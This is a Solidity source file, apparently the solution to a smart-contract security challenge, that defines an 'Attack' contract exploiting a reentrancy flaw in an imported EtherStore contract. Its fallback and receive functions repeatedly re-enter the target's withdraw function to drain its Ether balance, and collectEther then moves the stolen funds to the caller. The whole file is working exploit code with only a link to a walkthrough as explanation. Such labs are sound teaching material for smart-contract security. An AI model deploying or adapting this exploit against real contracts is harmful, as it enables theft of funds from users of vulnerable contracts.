// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

// Walkthrough -> https://medium.com/coinmonks/exploiting-smart-contracts-understanding-and-performing-reentrancy-attacks-in-solidity-b6aa29337828

import {EtherStore} from "../../src/challenge-01/Challenge01.sol";

contract Attack {
    EtherStore public etherStore;
    uint256 constant AMOUNT = 1 ether;

 
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

   
    function _triggerWithdraw() internal {
        if (address(etherStore).balance >= AMOUNT) {
            etherStore.withdraw();
        }
    }

   
    fallback() external payable {
        _triggerWithdraw();
    }

    
    receive() external payable {
        _triggerWithdraw();
    }

  
    function attack() external payable {
        require(msg.value >= AMOUNT, "Insufficient attack amount");

        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw();
    }

    /**
     * @notice Collects Ether from the Attack contract after the exploit
     */
    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    /**
     * @notice Gets the balance of the Attack contract
     * @return The balance of the contract in wei
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
